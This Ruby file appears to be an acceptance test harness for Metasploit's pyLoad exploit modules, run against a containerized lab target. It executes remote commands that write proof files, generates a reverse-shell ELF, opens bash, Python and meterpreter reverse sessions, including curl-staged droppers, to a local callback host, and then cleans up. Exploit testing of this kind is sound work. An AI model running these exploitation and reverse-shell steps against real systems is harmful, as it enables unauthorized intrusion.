# frozen_string_literal: true

require_relative '../rsync_creds/native'
require 'shellwords'

# Real pyLoad state, public owner execution and sessions from the application UID.
module PyloadTarget
  include RsyncCredentialTarget

  CONFIG = JSON.parse(File.read(File.join(__dir__, 'releases.json'))).freeze

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'pyload.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_command(label, role, *, required: true)
    if role == 'linux'
      super(label, 'app', 's6-setuidgid', 'abc', *, required: required)
    else
      super
    end
  end

  def rc_resource_roles
    %w[app reporting_db]
  end

  def py_native(phase)
    argv = ['python3', '-B', 'test/module_targets/pyload/native.py', ENV.fetch('MODULE_TARGET_RUNTIME'), phase, @version]
    output, error, status = Open3.capture3(*argv)
    @rc.fetch(:native) << { phase: phase, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), output + error
    data = JSON.parse(File.read(File.join(target_runtime.fetch('artifacts'), 'native-pyload-' + phase + '.json')))
    expect(data.fetch('status')).to eq('passed')
    data
  end

  def py_snapshot
    output, = rc_command('snapshot', 'app', 'python3', '-c', File.read(File.join(__dir__, 'snapshot.py')))
    values = output.lines.filter_map { |line| JSON.parse(line.delete_prefix('NATIVE_JSON=')) if line.start_with?('NATIVE_JSON=') }
    expect(values.length).to eq(1)
    values.first
  end

  def py_call(label, kind, options = {}, surface: 'cnl', action: 'run -z', reuse: false, command_timeout: 120)
    offset = rc_json('framework.instance_variable_get(:@pyload_events).length')
    owner = CONFIG.fetch('owners').fetch(kind)
    record = { label: label, owner: owner, surface: surface, action: action, options: options }
    @rc.fetch(:calls) << record
    values = {
      'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'true', 'SSL' => false, 'TARGETURI' => '/',
      'VHOST' => 'pyload-target.invalid', 'HttpClientTimeout' => 15, 'DisablePayloadHandler' => true,
      'WfsDelay' => 0, 'AutoCheck' => true
    }.merge(options)
    values.delete('CMD') unless values.fetch('PAYLOAD') == 'cmd/unix/generic' || options.key?('CMD')
    unless reuse
      console_command('back')
      expect(console_command('use ' + owner)).not_to match(/Failed to load|Unknown command|No results/)
    end
    %w[TARGET PAYLOAD].each { |name| console_command("set #{name} #{values.fetch(name)}") }
    # Complex command bytes belong in the public datastore API. Inline console
    # option formatting has a separate quoting contract from the owner module.
    if values.key?('CMD')
      command = values.delete('CMD')
      configured = rc_json("begin;active_module.datastore['CMD']=#{command.inspect};{command:active_module.datastore['CMD']};end")
      expect(configured.fetch('command')).to eq(command)
      record[:configured_command_base64] = Base64.strict_encode64(command)
    end
    values.delete('TARGET')
    values.delete('PAYLOAD')
    endpoint = @endpoints.fetch(surface)
    output = run_target_module(owner, 'app', values, endpoint_options: { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port') },
                                                     action: action, reuse_module: true, allow_errors: true, command_timeout: command_timeout) do |text|
      record[:output_base64] = Base64.strict_encode64(text.b)
      record[:events] = rc_json("framework.instance_variable_get(:@pyload_events).drop(#{offset})")
      record[:identity] = rc_json('active_module.object_id')
      if command
        preserved = rc_json("active_module.datastore['CMD']")
        record[:command_after_base64] = Base64.strict_encode64(preserved)
        expect(preserved).to eq(command)
      end
      rc_save
    end
    expect(output).not_to match(/Unknown datastore option|Error while running command|Call stack:|Parse error:/)
    expect(record.fetch(:events)).to include(include('event' => 'http'))
    [output, record]
  rescue Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError
    @console_failed = true
    record[:console_timeout] = true if record
    rc_save
    raise
  end

  def py_file(path)
    code = "import base64,json,sys;from pathlib import Path;p=Path(sys.argv[1]);print(json.dumps({'exists':p.is_file(),'uid':p.stat().st_uid if p.is_file()else None,'base64':base64.b64encode(p.read_bytes()).decode()if p.is_file()else None}))"
    output, = rc_command('proof-file', 'app', 'python3', '-c', code, path)
    JSON.parse(output)
  end

  def py_canary(label, kind, extra = {}, surface: 'cnl', expected: @release.fetch(kind), reuse: false, content: 'pyload-owner')
    path = "/tmp/module-target-pyload-owner-#{Process.pid}-#{label}"
    expect(py_file(path).fetch('exists')).to be(false)
    # Shellwords preserves the caller's literal quotes, slashes and newlines.
    command = "printf %s #{Shellwords.escape(content)} > #{path}"
    output, record = py_call(label, kind, { 'CMD' => command }.merge(extra), surface: surface, reuse: reuse)
    if expected
      expect(output).not_to include('Exploit failed', 'Exploit aborted')
      rc_poll(15) { py_file(path).fetch('exists') }
      expect(py_file(path)).to eq('exists' => true, 'uid' => CONFIG.fetch('uid'), 'base64' => Base64.strict_encode64(content))
    else
      expect(record.fetch(:events)).to include(include('event' => 'http', 'code' => a_kind_of(Integer)))
      expect(py_file(path)).to eq('exists' => false, 'uid' => nil, 'base64' => nil)
    end
    record[:proof] = py_file(path)
    rc_save
    [output, record]
  ensure
    if path
      rc_command('remove-owner-proof', 'app', 'rm', '-f', path)
      expect(py_file(path).fetch('exists')).to be(false)
    end
  end

  def py_port
    socket = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    socket.local_address.ip_port
  ensure
    socket&.close
  end

  def py_artifact(path)
    code = "import hashlib,json,sys;from pathlib import Path;p=Path(sys.argv[1]);print(json.dumps({'exists':p.is_file(),'uid':p.stat().st_uid if p.is_file()else None,'sha256':hashlib.sha256(p.read_bytes()).hexdigest()if p.is_file()else None,'size':p.stat().st_size if p.is_file()else None}))"
    output, = rc_command('payload-artifact', 'app', 'python3', '-c', code, path)
    JSON.parse(output)
  end

  def py_tcp(port)
    code = "import json,sys;rows=[line.split()for line in open('/proc/net/tcp').read().splitlines()[1:]];print(json.dumps([{'state':r[3],'uid':int(r[7]),'inode':r[9]}for r in rows if int(r[2].split(':')[1],16)==int(sys.argv[1])and int(r[7])==1000]))"
    output, = rc_command('session-sockets', 'app', 'python3', '-c', code, port.to_s)
    JSON.parse(output)
  end

  def py_process(pid)
    code = "import json,sys;from pathlib import Path;p=Path('/proc')/sys.argv[1]/'status';s=p.read_text()if p.exists()else '';print(json.dumps({'exists':bool(s),'uid':int(next(l for l in s.splitlines()if l.startswith('Uid:')).split()[1])if s else None,'state':next(l for l in s.splitlines()if l.startswith('State:')).split()[1]if s else None}))"
    output, = rc_command('session-process', 'app', 'python3', '-c', code, pid.to_s)
    JSON.parse(output)
  end

  def py_native_shell32
    callback = @rc.fetch(:callback)
    server = TCPServer.new(callback.fetch(:bind), 0)
    port = server.local_address.ip_port
    generated = File.join(target_runtime.fetch('artifacts'), 'native-x86-shell.elf')
    path = "/tmp/module-target-pyload-native-shell-#{Process.pid}"
    expect(py_artifact(path).fetch('exists')).to be(false)
    generation = rc_json("begin;p=framework.payloads.create('linux/x86/shell_reverse_tcp');p.datastore.merge!('LHOST'=>#{callback.fetch(:host).inspect},'LPORT'=>#{port});p.validate;data=Msf::Util::EXE.to_executable_fmt(framework,p.arch,p.platform,p.generate,'elf',{});File.binwrite(#{generated.inspect},data);{sha256:Digest::SHA256.hexdigest(data),elf_class:data.getbyte(4)};end")
    expect(generation.fetch('elf_class')).to eq(1)
    argv = target_runtime.fetch('compose') + ['cp', generated, 'app:' + path]
    output, error, status = Open3.capture3(*argv)
    @rc.fetch(:commands) << { label: 'native-x86-copy', argv: argv, exit: status.exitstatus, stdout_base64: Base64.strict_encode64(output.b), stderr: error }
    expect(status.success?).to be(true), output + error
    rc_command('native-x86-executable', 'app', 'chmod', '755', path)
    token = 'native-x86-' + Process.pid.to_s
    receiver = Thread.new do
      socket = nil
      Timeout.timeout(10) do
        socket = server.accept
        socket.write("printf '%s\\n' #{token};id -u;echo $$;printf '%s\\n' #{token}-done;exit\n")
        response = String.new
        response << socket.readpartial(4096) until response.include?(token + "-done\n")
        response
      end
    ensure
      socket&.close
    end
    receiver.report_on_exception = false
    code = "import json,subprocess,sys;p=subprocess.Popen([sys.argv[1]],stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True);print(json.dumps({'pid':p.pid}))"
    output, = rc_command('native-x86-launch', 'linux', 'python3', '-c', code, path)
    launch = JSON.parse(output)
    response = Timeout.timeout(12) { receiver.value }
    lines = response.lines.map(&:strip)
    expect(lines).to include(token, '1000', token + '-done')
    expect(py_artifact(path)).to include('exists' => true, 'sha256' => generation.fetch('sha256'))
    rc_poll(10) do
      native = py_process(launch.fetch('pid'))
      !native.fetch('exists') || native.fetch('state') == 'Z'
    end
    @rc.fetch(:native) << { phase: 'independent-x86-network-shell', generation: generation, launch: launch, response_base64: Base64.strict_encode64(response), passed: true }
  ensure
    server&.close
    if receiver
      receiver.kill if receiver.alive?
      receiver.join
    end
    if path
      rc_command('native-x86-remove', 'app', 'rm', '-f', path)
      expect(py_artifact(path).fetch('exists')).to be(false)
    end
    rc_save
  end

  def py_session(label, kind, family, surface: 'cnl', reuse: false)
    payload, target, session_type = {
      'command' => ['cmd/unix/python/meterpreter_reverse_tcp', 0, 'meterpreter'],
      'bash' => ['cmd/unix/reverse_bash', 0, 'shell'],
      'python' => ['python/meterpreter_reverse_tcp', 2, 'meterpreter'],
      'python_shell' => ['python/shell_reverse_tcp', 2, 'shell'],
      'dropper64' => ['linux/x64/meterpreter_reverse_tcp', 1, 'meterpreter'],
      'dropper32' => ['linux/x86/shell_reverse_tcp', 1, 'shell']
    }.fetch(family)
    callback = @rc.fetch(:callback)
    port = py_port
    expect(py_tcp(port)).to eq([])
    options = {
      'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port,
      'ReverseListenerBindAddress' => callback.fetch(:bind), 'DisablePayloadHandler' => false,
      'AutoCheck' => !reuse, 'WfsDelay' => 20
    }
    # This payload uses CMD as an executable path, unlike cmd/unix/generic.
    # Reset it explicitly when the console reuses the owner's datastore.
    options['CMD'] = '/bin/sh' if family == 'dropper32'
    if family.start_with?('dropper')
      options.merge!('CMDSTAGER::FLAVOR' => 'curl', 'CMDSTAGER::TEMP' => '/tmp', 'SRVHOST' => callback.fetch(:bind),
                     'SRVPORT' => py_port, 'URIHOST' => callback.fetch(:host))
    end
    output, call = py_call(label, kind, options, surface: surface, reuse: reuse)
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created')
    metadata = rc_poll(30) do
      sessions = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,db_id:s.db_record&.id}}')
      ready = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |session| session.fetch('type') == session_type && session['db_id'] && ready.any? { |event| event.fetch('id') == session.fetch('id') } }
    end
    owner = CONFIG.fetch('owners').fetch(kind)
    expect(metadata.values_at('owner', 'payload')).to eq([owner, 'payload/' + payload])
    identifier = metadata.fetch('id')
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    expect(py_file(proof).fetch('exists')).to be(false)
    if session_type == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      expected = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('pyload-session');ensure;f.close if f;end;{pid:s.sys.process.getpid,identity:s.sys.config.getuid,platform:s.platform};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      expected = 'pyload-session'
    end
    expect(result).not_to have_key('error')
    expect(py_file(proof)).to eq('exists' => true, 'uid' => CONFIG.fetch('uid'), 'base64' => Base64.strict_encode64(expected))
    expect(py_tcp(port)).to include(include('state' => '01', 'uid' => CONFIG.fetch('uid')))
    # This Python shell runs each command in a short-lived child of the HTTP
    # worker. Its reported $$ is not the persistent socket-owning process.
    persistent_pid = family == 'python_shell' ? @baseline.fetch('processes').first.fetch('pid') : result.fetch('pid')
    native_process = py_process(persistent_pid)
    expect(native_process).to include('exists' => true, 'uid' => CONFIG.fetch('uid'))
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT s.id,s.stype,s.via_exploit,s.via_payload,host(h.address::inet) AS address FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}') row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => session_type, 'via_exploit' => owner, 'via_payload' => 'payload/' + payload))
    record = {
      label: label, family: family, metadata: metadata, proof: result,
      native_process: native_process.merge('pid' => persistent_pid), reports: reports, port: port
    }
    @rc.fetch(:sessions) << record
    if family.start_with?('dropper')
      record[:delivery] = call.fetch(:events).filter_map { |event| event['delivery'] }.last
      expect(record.fetch(:delivery)).not_to be_nil
      expect(record.fetch(:delivery).fetch('flavor')).to eq('curl')
      expect(record.fetch(:delivery).fetch('commands')).not_to be_empty
      delivery_paths = record.fetch(:delivery).fetch('commands').flat_map { |command| command.scan(%r{/tmp/[a-zA-Z0-9._-]+}) }.uniq
      expect(delivery_paths).not_to be_empty
      record[:delivery][:native_files] = delivery_paths.to_h { |path| [path, py_artifact(path)] }
      expect(record[:delivery][:native_files].values).to all(include('exists' => true, 'uid' => 1000, 'sha256' => record.fetch(:delivery).fetch('exe_sha256')))
    end
    call[:session] = metadata
    rc_save
  ensure
    if identifier && !@console_failed
      rc_command('remove-session-proof', 'app', 'rm', '-f', proof) if proof
      expect(py_file(proof).fetch('exists')).to be(false) if proof
      rc_json("DruidSessionControl.exit_remote(framework,#{identifier})")
      rc_json("begin;s=framework.sessions[#{identifier}];s.kill if s;{closed:#{identifier}};end")
      rc_poll(15) { py_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
      if result && family != 'python_shell'
        rc_poll(15) do
          native = py_process(result.fetch('pid'))
          !native.fetch('exists') || native.fetch('state') == 'Z'
        end
        record[:closed_process] = py_process(result.fetch('pid')) if record
      end
    end
    if delivery_paths && !@console_failed
      delivery_paths.each { |path| rc_poll(15) { !py_artifact(path).fetch('exists') } }
      record[:delivery][:paths_absent] = delivery_paths
    end
    unless @console_failed
      console_command('jobs -K')
      expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    end
    rc_save
  end

  def py_failed_bootstrap(kind)
    callback = @rc.fetch(:callback)
    port = py_port
    missing = "/tmp/module-target-pyload-missing-shell-#{Process.pid}"
    expect(py_artifact(missing).fetch('exists')).to be(false)
    offset = File.readlines(@observer.fetch('ready_event_path')).length
    options = {
      'TARGET' => 1, 'PAYLOAD' => 'linux/x86/shell_reverse_tcp', 'CMD' => missing,
      'LHOST' => callback.fetch(:host), 'LPORT' => port, 'ReverseListenerBindAddress' => callback.fetch(:bind),
      'DisablePayloadHandler' => false, 'AutoCheck' => false, 'WfsDelay' => 2,
      'CMDSTAGER::FLAVOR' => 'curl', 'CMDSTAGER::TEMP' => '/tmp',
      'SRVHOST' => callback.fetch(:bind), 'SRVPORT' => py_port, 'URIHOST' => callback.fetch(:host)
    }
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    output, call = py_call('expected-bootstrap-eof', kind, options, surface: kind == 'sandbox' ? 'web' : 'cnl', command_timeout: 40)
    call[:elapsed] = Process.clock_gettime(Process::CLOCK_MONOTONIC) - started
    expect(call.fetch(:elapsed)).to be < 40
    expect(output).to match(/Command shell session \d+ closed/)
    expect(output).to include('Exploit completed, but no session was created.')
    expect(File.readlines(@observer.fetch('ready_event_path')).drop(offset)).to eq([])
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    expect(py_tcp(port)).to eq([])
    delivery = call.fetch(:events).filter_map { |event| event['delivery'] }.last
    expect(delivery).not_to be_nil
    paths = delivery.fetch('commands').flat_map { |command| command.scan(%r{/tmp/[a-zA-Z0-9._-]+}) }.uniq
    expect(paths).not_to be_empty
    paths.each { |path| rc_poll(10) { !py_artifact(path).fetch('exists') } }
    call[:failed_delivery] = delivery.merge('paths_absent' => paths, 'expected_missing_shell' => missing)
    rc_save
  ensure
    console_command('jobs -K') unless @console_failed
  end
end
